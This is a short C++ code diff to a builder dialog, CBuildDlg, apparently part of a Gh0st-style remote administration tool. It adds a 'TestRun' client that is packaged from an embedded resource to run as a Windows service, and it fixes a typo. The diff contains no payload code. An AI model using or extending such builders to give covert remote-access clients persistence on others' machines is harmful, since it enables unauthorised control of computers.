@@ -19,6 +19,7 @@ enum Index {
     IndexServerDll,
     IndexTinyRun,
     IndexGhostMsc,
+    IndexTestRunMsc,
     OTHER_ITEM
 };
 
@@ -196,9 +197,15 @@ void CBuildDlg::OnBnClickedOk()
     case IndexGhostMsc:
         file = "ghost.exe";
         typ = CLIENT_TYPE_ONE;
-        startup = Startup_GhostMsc,
+        startup = Startup_GhostMsc;
         szBuffer = ReadResource(is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86, dwFileSize);
         break;
+	case IndexTestRunMsc:
+		file = "TestRun.exe";
+		typ = CLIENT_TYPE_MEMDLL;
+        startup = Startup_TestRunMsc;
+		szBuffer = ReadResource(is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86, dwFileSize);
+		break;
     case IndexServerDll:
         file = "ServerDll.dll";
         typ = CLIENT_TYPE_DLL;
@@ -381,6 +388,7 @@ BOOL CBuildDlg::OnInitDialog()
     m_ComboExe.InsertString(IndexServerDll, "ServerDll.dll");
     m_ComboExe.InsertString(IndexTinyRun, "TinyRun.dll");
     m_ComboExe.InsertString(IndexGhostMsc, "ghost.exe - Windows 服务");
+    m_ComboExe.InsertString(IndexTestRunMsc, "TestRun - Windows 服务");
     m_ComboExe.InsertString(OTHER_ITEM, CString("选择文件"));
     m_ComboExe.SetCurSel(IndexTestRun_MemDLL);
 
